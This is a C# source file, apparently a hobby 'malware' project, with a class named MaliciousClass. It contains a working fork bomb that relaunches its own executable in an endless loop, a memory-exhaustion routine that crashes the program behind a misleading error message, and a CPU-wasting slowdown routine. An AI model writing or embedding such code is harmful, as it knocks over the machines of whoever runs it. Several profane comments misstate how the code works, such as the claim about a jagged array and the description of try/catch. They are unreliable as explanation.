using System;
using System.Collections.Generic;
using System.Reflection;
using System.Diagnostics;
using System.Security.AccessControl;
using System.Windows.Forms;

// maybe explain what half of these things are
namespace leungware_v420
{
    public class MaliciousClass
    {
        // ReSharper disable once MemberCanBeMadeStatic.Global
        public void ForkBomb(bool confirmation)
        {
            // Essentially makes new versions of this process repeatedly, with NO END
            // use with caution!
            // ReSharper disable once LoopVariableIsNeverChangedInsideLoop
            while (confirmation)
            {
                Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }

        private static IEnumerable<double> GetData()
        {
            // Generates a new random number.
            // ReSharper disable once HeapView.ObjectAllocation.Evident
            Random rnd = new Random();
            // Creates a new C# List<double> to fuck with.
            // ReSharper disable once HeapView.ObjectAllocation.Evident
            List<double> valuesDoubles = new List<double>();
            // Now, it continuously to the above List<double>, until it reaches the max value for a 64bit signed integer.
            for (long i = 0; i < long.MaxValue; i++)
            {
                // Uses double to really fuck with the app.
                valuesDoubles.Add(rnd.NextDouble());
            }
            // It then *attempts* further breaks the app by turning that C# List<double> to a jagged array, and stressing the CPU.
            return valuesDoubles.ToArray();
        }

        // A function that uses the above GetData() function to crash the app, causing a System.OutOfMemoryException.
        // ReSharper disable once MemberCanBeMadeStatic.Global
        public void CrashProgram()
        {
            // For rethinkingrn, try{}catch{} is essentially an if(true){}else{} for errors.
            try
            {
                // Creates a new IEnumerable (which basically is a List<> but fancier, and then attempts to fit that huge list into Malloc(), which fucks the program.
                IEnumerable<double> values = GetData();
            }
            // Displays an error message! 
            catch (Exception e)
            {
                MessageBox.Show(
                    // ReSharper disable once LocalizableElement
                    $"An error has occured, maybe try changing your settings?: {Environment.NewLine} {Environment.NewLine} {e}");
                throw;
            }
        }

        // ReSharper disable once MemberCanBeMadeStatic.Global
        public void SlowDownApplication(int dividend)
        {
            // Repeatedly makes a List<double> to really slow the app.
            for (long i = 0; i < int.MaxValue / dividend; i++)
            {
                // L I S T  T H I S  S T U F F 
                // ReSharper disable once HeapView.ObjectAllocation.Evident
                List<double> strList = new List<double> {double.MaxValue};
            } 
        }
    }
}
